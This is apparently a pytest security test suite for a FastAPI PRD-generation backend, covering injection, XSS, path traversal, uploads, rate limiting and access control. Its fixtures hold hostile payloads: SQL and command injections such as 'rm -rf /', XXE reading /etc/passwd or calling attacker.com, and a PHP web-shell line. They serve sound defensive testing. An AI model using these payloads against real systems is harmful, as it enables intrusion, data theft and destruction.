"""
Security tests for API endpoints and data validation.

Tests API security controls, input validation, output encoding,
and protection against common web vulnerabilities.
"""

import pytest
import json
import asyncio
import os
from unittest.mock import AsyncMock, MagicMock, patch
from fastapi.testclient import TestClient
from datetime import datetime, timedelta
from typing import Dict, List, Any

from backend.main import app
from backend.core.exceptions import SecurityViolationError, ValidationError


class TestAPIInputValidation:
    """Test API input validation and sanitization."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def auth_headers(self):
        """Create authentication headers."""
        # Mock JWT token for testing
        return {
            "Authorization": f"Bearer {os.getenv('TEST_JWT_TOKEN', 'mock_test_token')}"
        }

    @pytest.fixture
    def malicious_payloads(self):
        """Common malicious input payloads."""
        return {
            "sql_injection": [
                "'; DROP TABLE users; --",
                "' UNION SELECT password FROM users --",
                "admin'/**/OR/**/'1'='1",
                "1' AND SLEEP(5) --"
            ],
            "nosql_injection": [
                {"$ne": None},
                {"$regex": ".*"},
                {"$where": "function() { return true; }"},
                {"$gt": ""}
            ],
            "xss_payloads": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')></svg>",
                "'\"><script>alert('XSS')</script>"
            ],
            "xxe_payloads": [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>'
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2f etc/passwd",
                "....//....//....//etc/passwd"
            ],
            "command_injection": [
                "; cat /etc/passwd",
                "| whoami",
                "&& rm -rf /",
                "`id`",
                "$(cat /etc/passwd)"
            ]
        }

    async def test_sql_injection_protection_prd_endpoints(
        self, 
        client, 
        auth_headers, 
        malicious_payloads
    ):
        """Test SQL injection protection in PRD endpoints."""
        project_id = "test_project_123"
        
        for payload in malicious_payloads["sql_injection"]:
            # Test PRD generation endpoint
            prd_data = {
                "title": payload,
                "description": "Test PRD description",
                "requirements": ["Basic requirement"]
            }
            
            response = client.post(
                f"/api/projects/{project_id}/prds/generate",
                json=prd_data,
                headers=auth_headers
            )
            
            # Should reject malicious input or sanitize it
            assert response.status_code in [400, 422, 403]  # Bad Request, Validation Error, or Forbidden
            
            if response.status_code == 400:
                error_detail = response.json().get("detail", "")
                assert any(word in error_detail.lower() for word in ["invalid", "security", "validation"])

    async def test_nosql_injection_protection(
        self, 
        client, 
        auth_headers, 
        malicious_payloads
    ):
        """Test NoSQL injection protection."""
        for payload in malicious_payloads["nosql_injection"]:
            # Test with malicious JSON payload
            search_data = {
                "query": payload,
                "filters": {"category": payload}
            }
            
            response = client.post(
                "/api/search/prds",
                json=search_data,
                headers=auth_headers
            )
            
            # Should reject NoSQL injection attempts
            assert response.status_code in [400, 422, 403]

    async def test_xss_protection_in_responses(
        self, 
        client, 
        auth_headers, 
        malicious_payloads
    ):
        """Test XSS protection in API responses."""
        project_id = "test_project_123"
        
        for payload in malicious_payloads["xss_payloads"]:
            # Try to create PRD with XSS payload
            prd_data = {
                "title": f"Test PRD {payload}",
                "description": f"Description with {payload}",
                "requirements": [f"Requirement {payload}"]
            }
            
            response = client.post(
                f"/api/projects/{project_id}/prds/generate",
                json=prd_data,
                headers=auth_headers
            )
            
            if response.status_code == 201:
                # If creation succeeds, response should have sanitized content
                response_data = response.json()
                prd_content = str(response_data.get("data", {}))
                
                # Should not contain dangerous XSS elements
                assert "<script>" not in prd_content
                assert "javascript:" not in prd_content
                assert "onerror=" not in prd_content
                assert "onload=" not in prd_content

    async def test_path_traversal_protection(
        self, 
        client, 
        auth_headers, 
        malicious_payloads
    ):
        """Test path traversal protection in file operations."""
        for payload in malicious_payloads["path_traversal"]:
            # Test file download endpoint with path traversal
            response = client.get(
                f"/api/files/download/{payload}",
                headers=auth_headers
            )
            
            # Should reject path traversal attempts
            assert response.status_code in [400, 403, 404]
            
            # Should not return system files
            if response.status_code == 200:
                content = response.content.decode()
                assert "root:" not in content  # /etc/passwd content
                assert "[boot loader]" not in content  # Windows SAM file

    async def test_command_injection_protection(
        self, 
        client, 
        auth_headers, 
        malicious_payloads
    ):
        """Test command injection protection."""
        for payload in malicious_payloads["command_injection"]:
            # Test export endpoint that might execute system commands
            export_data = {
                "format": "pdf",
                "filename": f"export_{payload}.pdf",
                "options": {"template": payload}
            }
            
            response = client.post(
                "/api/prds/export",
                json=export_data,
                headers=auth_headers
            )
            
            # Should reject command injection attempts
            assert response.status_code in [400, 422, 403]

    async def test_file_upload_security(self, client, auth_headers):
        """Test file upload security controls."""
        # Test malicious file uploads
        malicious_files = [
            # Executable file
            ("file", ("malicious.exe", b"MZ\x90\x00", "application/octet-stream")),
            # Script file
            ("file", ("script.php", b"<?php system($_GET['cmd']); ?>", "text/plain")),
            # Large file (DoS attempt)
            ("file", ("large.txt", b"A" * (10 * 1024 * 1024), "text/plain")),  # 10MB
            # File with malicious name
            ("file", ("../../../evil.txt", b"content", "text/plain"))
        ]
        
        for file_data in malicious_files:
            response = client.post(
                "/api/files/upload",
                files=[file_data],
                headers=auth_headers
            )
            
            # Should reject malicious files
            assert response.status_code in [400, 413, 422, 403]  # Bad Request, Payload Too Large, etc.

    async def test_json_parsing_security(self, client, auth_headers):
        """Test JSON parsing security."""
        # Test malicious JSON payloads
        malicious_json_payloads = [
            # Deeply nested JSON (DoS attempt)
            {"a": {"b": {"c": {"d": {"e": {"f": {"g": "deep_nesting"}}}}}}},
            # Large JSON payload
            {"large_array": ["item"] * 100000},
            # JSON with circular reference attempt
            '{"a": {"b": {"c": "{{a}}"}}}',
        ]
        
        for payload in malicious_json_payloads:
            try:
                response = client.post(
                    "/api/projects/test_project/prds/generate",
                    json=payload,
                    headers=auth_headers,
                    timeout=5.0  # Short timeout to prevent hanging
                )
                
                # Should handle gracefully without hanging
                assert response.status_code in [400, 413, 422, 500]
            except Exception as e:
                # Should not cause server to crash
                assert "timeout" in str(e).lower() or "connection" in str(e).lower()

    async def test_parameter_pollution_protection(self, client, auth_headers):
        """Test HTTP parameter pollution protection."""
        # Test duplicate parameters
        polluted_params = "?status=pending&status=completed&status=draft"
        
        response = client.get(
            f"/api/prds{polluted_params}",
            headers=auth_headers
        )
        
        # Should handle parameter pollution gracefully
        assert response.status_code in [200, 400]
        
        if response.status_code == 200:
            # Should use consistent parameter handling
            data = response.json()
            assert isinstance(data, dict)  # Valid JSON response

    async def test_content_type_validation(self, client, auth_headers):
        """Test content type validation."""
        # Test with incorrect content type
        prd_data = json.dumps({
            "title": "Test PRD",
            "description": "Test description"
        })
        
        response = client.post(
            "/api/projects/test_project/prds/generate",
            data=prd_data,
            headers={**auth_headers, "Content-Type": "text/plain"}
        )
        
        # Should reject incorrect content type
        assert response.status_code in [400, 415, 422]  # Unsupported Media Type


class TestAPIRateLimiting:
    """Test API rate limiting and DDoS protection."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def auth_headers(self):
        """Create authentication headers."""
        return {
            "Authorization": f"Bearer {os.getenv('TEST_RATE_LIMIT_TOKEN', 'mock_rate_limit_token')}"
        }

    async def test_rate_limiting_per_user(self, client, auth_headers):
        """Test per-user rate limiting."""
        endpoint = "/api/prds"
        
        # Make multiple requests rapidly
        responses = []
        for i in range(20):  # Exceed typical rate limit
            response = client.get(endpoint, headers=auth_headers)
            responses.append(response)
            
            # Short delay to simulate rapid requests
            await asyncio.sleep(0.01)
        
        # Should get rate limited
        rate_limited_responses = [r for r in responses if r.status_code == 429]
        assert len(rate_limited_responses) > 0
        
        # Rate limit response should include appropriate headers
        rate_limited_response = rate_limited_responses[0]
        headers = rate_limited_response.headers
        
        assert "X-RateLimit-Limit" in headers
        assert "X-RateLimit-Remaining" in headers
        assert "Retry-After" in headers

    async def test_rate_limiting_per_ip(self, client):
        """Test per-IP rate limiting."""
        endpoint = "/api/auth/login"
        
        # Make multiple login attempts from same IP
        for i in range(10):
            response = client.post(
                endpoint,
                json={
                    "email": f"test{i}example.com",
                    "password": "wrong_password"
                },
                headers={"X-Forwarded-For": "192.168.1.100"}
            )
        
        # Should eventually get rate limited
        final_response = client.post(
            endpoint,
            json={
                "email": "user@company.local",
                "password": "password"
            },
            headers={"X-Forwarded-For": "192.168.1.100"}
        )
        
        assert final_response.status_code in [429, 403]

    async def test_burst_rate_limiting(self, client, auth_headers):
        """Test burst rate limiting for expensive operations."""
        endpoint = "/api/projects/test_project/prds/generate"
        
        prd_data = {
            "title": "Test PRD",
            "description": "Test description for burst limiting"
        }
        
        # Make multiple expensive requests simultaneously
        import concurrent.futures
        
        def make_request():
            return client.post(endpoint, json=prd_data, headers=auth_headers)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(make_request) for _ in range(5)]
            responses = [f.result() for f in futures]
        
        # Should limit concurrent expensive operations
        rate_limited_count = sum(1 for r in responses if r.status_code == 429)
        assert rate_limited_count > 0


class TestAPIAuthorizationSecurity:
    """Test API authorization and access control."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def user_token(self):
        """Regular user token."""
        return "Bearer user_token_123"

    @pytest.fixture 
    def admin_token(self):
        """Admin user token."""
        return "Bearer admin_token_456"

    @pytest.fixture
    def expired_token(self):
        """Expired token."""
        return "Bearer expired_token_789"

    async def test_unauthorized_access_protection(self, client):
        """Test protection against unauthorized access."""
        protected_endpoints = [
            "/api/projects",
            "/api/prds",
            "/api/dashboard",
            "/api/admin/users"
        ]
        
        for endpoint in protected_endpoints:
            response = client.get(endpoint)  # No auth headers
            assert response.status_code in [401, 403]

    async def test_role_based_access_control(self, client, user_token, admin_token):
        """Test role-based access control."""
        # Admin-only endpoints
        admin_endpoints = [
            "/api/admin/users",
            "/api/admin/system/health",
            "/api/admin/projects/all"
        ]
        
        for endpoint in admin_endpoints:
            # Regular user should be denied
            user_response = client.get(
                endpoint,
                headers={"Authorization": user_token}
            )
            assert user_response.status_code in [403, 404]
            
            # Admin should have access
            admin_response = client.get(
                endpoint,
                headers={"Authorization": admin_token}
            )
            assert admin_response.status_code in [200, 404]  # 404 if endpoint doesn't exist

    async def test_resource_ownership_validation(self, client, user_token):
        """Test resource ownership validation."""
        # Try to access another user's project
        other_user_project_id = "other_user_project_123"
        
        response = client.get(
            f"/api/projects/{other_user_project_id}",
            headers={"Authorization": user_token}
        )
        
        # Should deny access to other user's resources
        assert response.status_code in [403, 404]
        
        # Try to modify another user's PRD
        response = client.put(
            f"/api/projects/{other_user_project_id}/prds/test_prd",
            json={"title": "Modified title"},
            headers={"Authorization": user_token}
        )
        
        assert response.status_code in [403, 404]

    async def test_token_validation_security(self, client, expired_token):
        """Test token validation security."""
        # Test with expired token
        response = client.get(
            "/api/projects",
            headers={"Authorization": expired_token}
        )
        
        assert response.status_code == 401
        
        # Test with malformed token
        malformed_token = f"Bearer {os.getenv('TEST_MALFORMED_TOKEN', 'mock_malformed_token')}"
        response = client.get(
            "/api/projects",
            headers={"Authorization": malformed_token}
        )
        
        assert response.status_code == 401

    async def test_privilege_escalation_prevention(self, client, user_token):
        """Test prevention of privilege escalation attacks."""
        # Try to modify user role
        escalation_attempts = [
            {
                "endpoint": "/api/users/profile",
                "method": "PUT",
                "data": {"role": "admin"},
                "description": "Direct role modification"
            },
            {
                "endpoint": "/api/users/permissions",
                "method": "POST", 
                "data": {"permission": "admin_access", "grant": True},
                "description": "Permission escalation"
            }
        ]
        
        for attempt in escalation_attempts:
            if attempt["method"] == "PUT":
                response = client.put(
                    attempt["endpoint"],
                    json=attempt["data"],
                    headers={"Authorization": user_token}
                )
            elif attempt["method"] == "POST":
                response = client.post(
                    attempt["endpoint"],
                    json=attempt["data"],
                    headers={"Authorization": user_token}
                )
            
            # Should deny privilege escalation attempts
            assert response.status_code in [400, 403, 404, 422]


class TestAPIDataValidation:
    """Test API data validation and business logic security."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def auth_headers(self):
        """Create authentication headers."""
        return {"Authorization": "Bearer valid_test_token"}

    async def test_business_logic_validation(self, client, auth_headers):
        """Test business logic validation."""
        project_id = "test_project_123"
        
        # Test invalid business scenarios
        invalid_scenarios = [
            {
                "data": {
                    "title": "",  # Empty title
                    "description": "Valid description",
                    "requirements": []
                },
                "expected_error": "title"
            },
            {
                "data": {
                    "title": "A" * 1000,  # Excessively long title
                    "description": "Valid description",
                    "requirements": ["req1"]
                },
                "expected_error": "length"
            },
            {
                "data": {
                    "title": "Valid title",
                    "description": "Valid description",
                    "requirements": ["req"] * 1000  # Too many requirements
                },
                "expected_error": "requirements"
            }
        ]
        
        for scenario in invalid_scenarios:
            response = client.post(
                f"/api/projects/{project_id}/prds/generate",
                json=scenario["data"],
                headers=auth_headers
            )
            
            assert response.status_code in [400, 422]
            
            error_detail = response.json().get("detail", "")
            assert scenario["expected_error"] in str(error_detail).lower()

    async def test_data_type_validation(self, client, auth_headers):
        """Test data type validation."""
        project_id = "test_project_123"
        
        # Test with incorrect data types
        invalid_type_data = [
            {
                "title": 12345,  # Should be string
                "description": "Valid description",
                "requirements": ["req1"]
            },
            {
                "title": "Valid title",
                "description": ["not", "a", "string"],  # Should be string
                "requirements": ["req1"]
            },
            {
                "title": "Valid title",
                "description": "Valid description",
                "requirements": "should be array"  # Should be array
            }
        ]
        
        for data in invalid_type_data:
            response = client.post(
                f"/api/projects/{project_id}/prds/generate",
                json=data,
                headers=auth_headers
            )
            
            assert response.status_code in [400, 422]

    async def test_enum_validation(self, client, auth_headers):
        """Test enumeration validation."""
        # Test with invalid enum values
        invalid_enum_data = {
            "title": "Test PRD",
            "description": "Test description",
            "priority": "super_critical",  # Invalid priority level
            "status": "invalid_status",    # Invalid status
            "type": "unknown_type"         # Invalid type
        }
        
        response = client.post(
            "/api/projects/test_project/prds/generate",
            json=invalid_enum_data,
            headers=auth_headers
        )
        
        assert response.status_code in [400, 422]

    async def test_cross_field_validation(self, client, auth_headers):
        """Test cross-field validation rules."""
        # Test logically inconsistent data
        inconsistent_data = {
            "title": "Test PRD",
            "description": "Test description",
            "start_date": "2024-12-31",
            "end_date": "2024-01-01",    # End before start
            "budget": -1000,             # Negative budget
            "team_size": 0               # Zero team size
        }
        
        response = client.post(
            "/api/projects",
            json=inconsistent_data,
            headers=auth_headers
        )
        
        assert response.status_code in [400, 422]

    async def test_data_sanitization(self, client, auth_headers):
        """Test data sanitization in responses."""
        # Create PRD with potentially sensitive data
        prd_data = {
            "title": "Test PRD with sensitive data",
            "description": "Contains API key: sk-1234567890abcdef and password: secret123",
            "requirements": [
                "Database connection: postgres://user:password@host/db",
                "API endpoint: https://api.example.com?key=secret_key_123"
            ]
        }
        
        response = client.post(
            "/api/projects/test_project/prds/generate",
            json=prd_data,
            headers=auth_headers
        )
        
        if response.status_code == 201:
            response_data = response.json()
            response_text = json.dumps(response_data)
            
            # Should sanitize sensitive information
            assert "sk-1234567890abcdef" not in response_text
            assert "password" not in response_text.lower()
            assert "secret123" not in response_text
            assert "secret_key_123" not in response_text